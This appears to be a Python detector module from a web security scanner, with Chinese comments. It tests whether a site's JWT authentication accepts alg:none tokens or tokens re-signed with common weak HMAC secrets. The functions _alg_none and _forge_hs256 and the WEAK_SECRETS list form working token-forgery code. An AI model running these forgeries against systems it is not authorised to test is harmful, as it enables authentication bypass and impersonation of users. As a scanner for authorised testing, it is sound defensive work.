"""JWT 弱点检测器（站点级）：检测 alg:none 接受与弱密钥可被伪造。仅对授权目标使用。

原理：从响应头/Set-Cookie 以及用户通过 --header/--cookie 提供的认证信息中找出 JWT，
      先确认端点确实在用该 token 做鉴权（无 token=401），再尝试：
        1) 把 alg 改成 none 重放 —— 若仍 200，说明服务端未校验签名（alg:none 绕过）
        2) 用常见弱密钥重新签名重放 —— 若仍 200，说明密钥可爆破
不依赖外部库，纯 base64url + hmac 实现。
"""
import base64
import hmac
import hashlib
import json
import re
from typing import List

from ..models import Target, Finding
from .base import Detector

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
WEAK_SECRETS = ["", "secret", "key", "password", "123456", "admin", "test", "changeme"]


def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _alg_none(token: str) -> str:
    h, p, _ = token.split(".")
    hh = json.loads(_b64url_decode(h))
    hh["alg"] = "none"
    nh = _b64url_encode(json.dumps(hh, separators=(",", ":")).encode())
    return nh + "." + p + "."


def _forge_hs256(token: str, secret: str) -> str:
    h, p, _ = token.split(".")
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(),
                   hashlib.sha256).digest()
    return f"{h}.{p}." + _b64url_encode(sig)


class JwtDetector(Detector):
    name = "jwt_weakness"
    severity = "High"

    async def scan(self, target: Target) -> List[Finding]:
        if not target.is_site:
            return []
        # 1) 收集候选 JWT 及其所在位置（保留前缀，如 "Bearer "）
        places = []
        try:
            base = await self.req.request("GET", target.url)
        except Exception:
            return []
        if not base.error:
            for name, val in base.headers.items():
                m = JWT_RE.search(val)
                if m:
                    places.append(("header", name, val[:m.start()], m.group()))
            sc = base.headers.get("Set-Cookie", "")
            for part in sc.split(","):
                cname, _, cval = part.strip().partition("=")
                m = JWT_RE.search(cval)
                if m:
                    places.append(("cookie", cname, "", m.group()))
        # 2) 用户显式提供的认证信息
        for hname, hval in (self.cfg.headers or {}).items():
            if hname.lower() == "cookie":
                for part in hval.split(";"):
                    cn, _, cv = part.strip().partition("=")
                    m = JWT_RE.search(cv)
                    if m:
                        places.append(("cookie", cn, "", m.group()))
            else:
                m = JWT_RE.search(hval)
                if m:
                    places.append(("header", hname, hval[:m.start()], m.group()))

        findings = []
        for kind, name, prefix, token in places:
            res = await self._evaluate(target, kind, name, prefix, token)
            findings.extend(res)
        return findings

    async def _evaluate(self, target, kind, name, prefix, token) -> List[Finding]:
        def mk(t):
            headers = ({"Cookie": f"{name}={prefix}{t}"} if kind == "cookie"
                       else {name: prefix + t})
            return self.req.request("GET", target.url, headers=headers)

        valid = await mk(token)
        garbage = await mk("invalid.token.here")
        # 端点未用该 token 鉴权（无 token 也 2xx）则无意义
        if valid.status < 200 or valid.status >= 300 or garbage.status < 400:
            return []

        out = []
        none_tok = _alg_none(token)
        none_r = await mk(none_tok)
        if 200 <= none_r.status < 300:
            out.append(Finding(
                detector=JwtDetector.name, severity="High",
                url=target.url, param="(jwt)", payload=f"alg=none ({kind}:{name})",
                evidence="将 alg 改为 none 后服务端仍返回 2xx，未校验签名",
                description="服务端接受 alg=none 的 JWT，攻击者可伪造任意身份令牌。",
                recommendation="固定使用非对称算法(RS256)或强制校验签名与预期 alg；"
                               "拒绝 alg=none/HS* 意外组合。",
            ))
        for secret in WEAK_SECRETS:
            forged = _forge_hs256(token, secret)
            r = await mk(forged)
            if 200 <= r.status < 300:
                out.append(Finding(
                    detector=JwtDetector.name, severity="High",
                    url=target.url, param="(jwt)", payload=f"弱密钥伪造: {secret!r}",
                    evidence=f"用密钥 {secret!r} 重签名后服务端返回 2xx",
                    description="JWT 使用可被爆破的弱 HMAC 密钥，攻击者可伪造令牌。",
                    recommendation="使用足够长且随机的 HMAC 密钥；考虑非对称算法。",
                ))
                break
        return out
